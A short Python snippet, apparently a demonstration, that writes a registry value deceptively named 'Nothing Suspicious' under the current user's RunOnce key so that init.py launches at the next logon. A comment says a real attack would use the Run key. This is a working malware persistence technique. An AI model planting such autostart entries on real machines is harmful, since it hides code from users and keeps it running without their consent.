import winreg
import os

key_path = winreg.HKEY_CURRENT_USER

# In an actual attack, "RunOnce" will be replaced with "Run"
sub_key = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"

key = winreg.CreateKey(key_path, sub_key)
winreg.SetValueEx(key, "Nothing Suspicious", 0, winreg.REG_SZ, os.path.join(os.getcwd(), 'init.py'))